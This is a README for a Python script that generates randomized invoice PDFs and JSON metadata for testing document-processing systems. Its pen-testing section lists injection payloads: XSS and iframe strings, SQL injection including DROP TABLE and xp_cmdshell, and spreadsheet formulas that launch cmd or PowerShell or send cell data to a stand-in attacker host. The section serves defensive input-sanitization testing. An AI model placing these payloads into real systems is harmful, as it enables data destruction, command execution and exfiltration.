# Invoice Generator

A Python script to generate randomized financial invoice PDFs with realistic data and metadata for testing document processing systems.

## Features

- **Randomized Data**: Generates invoices with random companies, addresses, line items, dates, and amounts
- **Single & Multi-Page Support**: Creates both single-page and multi-page invoices (2-4 pages)
- **Document Transformations**: 
  - Rotation: Clockwise and counter-clockwise rotation (-15° to +15°)
  - Offset: Off-center pages with random X/Y offsets
- **JSON Metadata**: Generates structured metadata matching your data schema
- **Batch Generation**: Generate any number of invoices in one run

## Installation

### In DevContainer (Recommended)

If you're using the VS Code DevContainer, dependencies are managed via system packages:

```bash
cd generate_pdf_scripts
bash setup_and_test.sh
```

This will:
- Install `python3-reportlab` via apt (system package)
- Install `PyPDF2>=3.0.0` via pip (for latest features)
- Generate 5 test invoices

### Standalone Installation

1. Install Python dependencies:

```bash
pip install -r requirements.txt
```

Or install directly:

```bash
pip install reportlab PyPDF2
```

## Usage

### Basic Usage

Generate 10 invoices (default):

```bash
python generate_invoices.py
```

### Custom Number of Invoices

Generate 50 invoices:

```bash
python generate_invoices.py -n 50
```

### Custom Output Directory

```bash
python generate_invoices.py -o my_invoices
```

### Control Invoice Characteristics

```bash
# 50% multi-page, 30% rotated, 40% off-center
python generate_invoices.py -n 100 --multi-page-ratio 0.5 --rotation-ratio 0.3 --offset-ratio 0.4
```

### Pen Testing Mode - Dangerous Payload Injection

⚠️  **For Security Testing Only**

Generate invoices with dangerous payloads injected into various fields for penetration testing:

```bash
# Generate invoices with dangerous payload injection
python generate_invoices.py -n 50 --dangerous-html
```

This mode injects three types of attack vectors:

#### 1. HTML Injection (XSS)
- Script tags: `<script>alert('XSS')</script>`
- Event handlers: `<img src=x onerror=alert('XSS')>`
- Iframe injections: `<iframe src='http://malicious.com'></iframe>`
- Form hijacking and data exfiltration attempts
- Encoded payloads and mixed case evasion
- CSS injection and meta refresh redirects

#### 2. SQL Injection
- Basic injection: `' OR '1'='1`, `admin' --`
- UNION-based: `' UNION SELECT username, password FROM users--`
- Stacked queries: `'; DROP TABLE users--`
- Time-based blind injection: `'; SELECT SLEEP(5)--`
- Boolean-based blind injection: `' AND 1=1--`
- Authentication bypass: `admin' OR '1'='1' --`
- Command injection via SQL: `'; exec xp_cmdshell('dir')--`

#### 3. CSV Formula Injection
- Excel formulas: `=SUM(A1:A10)`, `=1+2+3`
- Command execution: `=cmd|'/c calc'!A1`
- DDE injection: `@SUM(1+1)*cmd|'/c calc'!A1`
- Hyperlink injection: `=HYPERLINK("http://malicious.com", "Click me")`
- Data exfiltration: `=WEBSERVICE("http://attacker.com/collect?data="&A1)`
- PowerShell execution: `=cmd|'/c powershell -Command "Start-Process calc"'!A1`

**Injection Locations**:
- Company names (vendor/customer): HTML + SQL
- Addresses (street, city): HTML + SQL
- Invoice numbers: SQL + CSV
- PO numbers: SQL + CSV
- Product descriptions: HTML + SQL + CSV
- Product codes: SQL + CSV

**File Naming**:
- All dangerous files are labeled with `_dangerous_` prefix
- Example: `invoice_dangerous_12345_XSS.pdf`

**Warning**: Only use these files in controlled testing environments. Do not use in production systems.

### Full Example

```bash
python generate_invoices.py \
  --count 200 \
  --output test_invoices \
  --multi-page-ratio 0.4 \
  --rotation-ratio 0.25 \
  --offset-ratio 0.3
```

## Command-Line Arguments

| Argument | Short | Type | Default | Description |
|----------|-------|------|---------|-------------|
| `--count` | `-n` | int | 10 | Number of invoices to generate |
| `--output` | `-o` | string | `generated_invoices` | Output directory path |
| `--multi-page-ratio` | | float | 0.3 | Ratio of multi-page invoices (0.0-1.0) |
| `--rotation-ratio` | | float | 0.2 | Ratio of rotated invoices (0.0-1.0) |
| `--offset-ratio` | | float | 0.2 | Ratio of off-center invoices (0.0-1.0) |
| `--dangerous-html` | | flag | false | Enable dangerous payload injection (HTML, SQL, CSV) for pen testing ⚠️ |

## Output Structure

```
generated_invoices/
├── pdfs/
│   ├── invoice_12345_1791003.pdf
│   ├── invoice_12346_1791004.pdf
│   ├── invoice_dangerous_12347_XSS_test.pdf  # Pen testing file
│   └── ...
├── json/
│   ├── invoice_12345_1791003.json
│   ├── invoice_12346_1791004.json
│   ├── invoice_dangerous_12347_XSS_test.json  # Pen testing metadata
│   └── ...
└── generation_summary.json
```

### PDF Files
- Professional invoice layout with headers, line items, and totals
- Support for 1-4 pages
- Optional rotation and offset transformations

### JSON Files
Each invoice includes comprehensive metadata:
- Entity and document IDs
- Extracted data (invoice details, line items, totals)
- Processing steps and timestamps
- Stage and status information

### Summary File
The `generation_summary.json` file contains:
- Total number of invoices generated
- Directory paths
- Generation timestamp
- List of all generated invoices with their IDs and filenames

## Data Included

Each invoice contains:
- **Invoice Details**: Invoice number, date, due date, PO number (optional)
- **Parties**: Vendor and customer names and addresses
- **Line Items**: 3-50+ items with descriptions, quantities, unit prices, totals
- **Calculations**: Subtotal, tax (5-9.5%), shipping (optional), grand total
- **Metadata**: Complete JSON structure matching your schema

## Example Output

### Sample Invoice Data
```json
{
  "invoiceNumber": "1791003",
  "invoiceDate": "Nov 03, 2021",
  "dueDate": "Nov 18, 2021",
  "vendorName": "Contoso, Ltd.",
  "customerName": "Wingtip Toys",
  "invoiceTotal": 454.66,
  "lineItems": [
    {
      "description": "Complete golf set. Left-handed",
      "quantity": 1,
      "unitPrice": 390.00,
      "total": 390.00
    }
  ]
}
```

## Invoice Variations

The generator creates diverse invoices:
- **Companies**: 20 different company names
- **Products**: 20 different product types with realistic pricing
- **Locations**: 20 US cities across multiple states
- **Dates**: Random dates between 2020-2026
- **Line Items**: 3-50+ items per invoice
- **Pages**: 1-4 pages per invoice
- **Orientations**: Normal, rotated ±5°, ±10°, ±15°
- **Positions**: Centered and off-center (±20 pixels)

## Use Cases

- Testing document AI extraction systems
- Training machine learning models
- QA testing for invoice processing pipelines
- Load testing document processing systems
- Validating OCR and data extraction accuracy
- **Security Testing**: Pen testing with dangerous payload injection (HTML/XSS, SQL injection, CSV formula injection) to validate input sanitization and security controls

## Notes

- All data is randomly generated and not based on real companies or transactions
- PDFs are created with ReportLab for professional appearance
- Transformations (rotation/offset) use PyPDF2 for realistic document variations
- JSON metadata follows the exact schema provided in requirements

## Make Script Executable (Optional)

```bash
chmod +x generate_invoices.py
./generate_invoices.py -n 20
```

## Troubleshooting

**Import errors**: Make sure dependencies are installed:
```bash
pip install --upgrade reportlab PyPDF2
```

**Permission errors**: Ensure write permissions in the output directory

**Memory issues with large batches**: Generate in smaller batches (e.g., 500 at a time)
